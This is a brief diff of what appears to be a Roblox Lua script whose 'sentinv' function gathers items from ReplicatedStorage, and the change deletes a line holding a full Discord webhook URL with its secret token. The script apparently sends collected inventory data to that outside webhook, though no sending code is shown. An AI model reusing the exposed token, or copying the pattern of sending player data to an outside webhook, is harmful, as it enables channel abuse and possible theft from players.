@@ -313,7 +313,6 @@ local function sentinv()
     local findinv = game:GetService("ReplicatedStorage")._FX_CACHE
 local global = workspace
 local ItemCollection = {}
-_G.webhook_url = "https://discord.com/api/webhooks/1321439574526001152/bFmQBCsgqvvhVSJ9FFYCmhODYsTwoeBLs6uQcLp6THeTHQtQuoiV5iiqg5LFasFVRKAj"
 for i, v in pairs(global:GetChildren()) do
     if v.Name == "weather" then
         for j, item in pairs(findinv:GetChildren()) do
